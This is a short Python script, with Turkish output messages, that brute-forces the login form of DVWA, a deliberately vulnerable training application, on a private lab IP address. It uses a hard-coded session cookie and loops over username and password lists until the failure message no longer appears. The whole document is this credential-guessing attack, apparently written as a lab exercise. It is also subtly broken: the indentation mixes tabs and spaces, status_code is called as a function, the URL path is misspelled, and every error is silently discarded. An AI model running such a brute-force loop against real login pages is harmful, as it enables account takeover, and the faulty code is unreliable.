import requests

def web_bruteforce():
	header={"Cookie": "security=low; PHPSESSID=34127381273dsajdjaslkdas812730812dasjdnajlksndjkla"}
    username_list = ['username','password']
    password_list = ['username','password']
    for i in username_list:
        for j in password_list:
            try:
                url = "http://192.168.1.41/dvwa/vulnerabilites/brute/?username="+str(i)+"&password="+str(j)+"&Login=Login"
                sonuc = requests.get(url=url, headers=header)
                print("Username: ",i)
                print("Password: ",j)
                print("Status Code: ",sonuc.status_code())
                print("Uzunluk: ",len(sonuc.content))
                if not "Username and/or password incorrect" in str(sonuc.content):
                	print("Kullanıcı adı ve parola doğru")
                print("=============================")
            except BaseException as e:
                pass

if __name__ == "__main__":
    try:
        web_bruteforce()
    except BaseException as e:
        pass